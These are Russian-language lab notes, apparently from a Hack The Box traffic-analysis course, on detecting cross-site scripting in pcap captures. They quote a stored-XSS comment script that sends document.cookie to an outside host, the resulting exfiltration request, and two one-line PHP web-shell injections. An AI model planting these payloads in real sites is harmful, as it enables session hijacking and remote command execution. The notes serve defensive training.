`=====================================================================
* Руководство *
***************

Если использовать машину от HTB, то сперва надо запустить данную комнаду, чтобы скачать и распокавать все необходимые pcap файлы

	<usern_name>@<host_name>$ wget -O file.zip 'https://academy.hackthebox.com/storage/resources/pcap_files.zip' && mkdir tempdir && unzip file.zip -d tempdir && mkdir -p pcaps && mv tempdir/Intermediate_Network_Traffic_Analysis/* pcaps/ && rm -r tempdir file.zip

Удобнее всего просматривать PCAP-files используя Wireshark
Однако, в целях практики и выбработки навыков использования CLI-based tools мы будем использовать такие утилиты как tcpdump

=====================================================================
* Легенда *
***********

Предположим, мы просматриваем наши HTTP-запросы и замечаем, что значительная часть запросов отправляется на внутренний «сервер», который мы не распознали.
Мы можем заметить, что отправляется много значений, и в реальных случаях может быть не так очевидно, что это файлы cookie/токены пользователя.
Вместо этого они могут быть даже закодированы или зашифрованы во время передачи.
Это может быть явным признаком межсайтового скриптинга.

По сути, межсайтовый скриптинг работает через злоумышленника, внедряющего вредоносный код javascript или скрипт в одну из наших веб-страниц через пользовательский ввод.
Когда другие пользователи посещают наш веб-сервер, их браузеры будут выполнять этот код.
Злоумышленники во многих случаях будут использовать эту технику для кражи токенов, файлов cookie, значений сеанса и многого другого.

=====================================================================
* Подготовка *
**************

Как такового, подготовительного этапа, не существует
Для анализа чаще всего используют любой, подходящий пакетный анализатор
В нашем случае это - Wireshark

Чтобы предотвратить эти угрозы после их обнаружения, мы можем сделать следующее.

    -   Очищать и обрабатывать пользовательский ввод приемлемым образом.
    -   Не интерпретировать пользовательский ввод как код.

=====================================================================
* Анализ *
**********

Если бы мы исследовали один из пакетов путем Follow TCP Stream, то он выглядел бы следующим образом.	
    
    GET /aoidjw?cookie=?cookie=mZjQ17NLXY8ZNBbJCS0O HTTP/1.1
    Host: 192.168.10.5
    Connection: keep-alive
    User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
    Accept: */*
    Origin: http://192.168.10.7
    Referer: http://192.168.10.7/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9

    <!DOCTYPE HTML>
    <html lang="en">
        <head>
            <meta charset="utf-8">
            <title>Error response</title>
        </head>
        <body>
            <h1>Error response</h1>
            <p>Error code: 404</p>
            <p>Message: File not found.</p>
            <p>Error code explanation: 404 - Nothing matches the given URI.</p>
        </body>
    </html>

Для нас особый интерес предоставляет строка GET, а точнее значение cookie=mZjQ17NLXY8ZNBbJCS0O

Докопаться до корня, откуда исходит этот код, может быть довольно сложно.
Однако предположим, что на нашем веб-сервере есть область комментариев пользователей.
Мы можем заметить, что один из комментариев выглядит следующим образом.

    <script>
        window.addEventListener("load", function() {
            const url = "http://192.168.0.19:5555";
            const params = "cookie=" + encodeURIComponent(document.cookie);
            const request = new XMLHttpRequest();
            request.open("GET", url + "?" + params);
            request.send();
        });
    </script>

Это выглядит как успешный межсайтовый скрипт от злоумышленника
И поэтому нам надо как можно быстрее удалить этот комментарий
А также (даже в большинстве случаев) остановить наш сервер, чтобы исправить проблему, прежде чем она сохранится.

Мы также могли бы заметить в некоторых случаях, что злоумышленник может попытаться внедрить код в эти поля, как в следующих двух примерах.

    -   Для того, чтобы они могли получить управление и контроль через PHP.
        <?php system($_GET['cmd']); ?>
    
    -   Или выполнить одну команду с помощью PHP
        <?php echo `whoami` ?>
        
=====================================================================
* Дополнительные Вопросы *
**************************

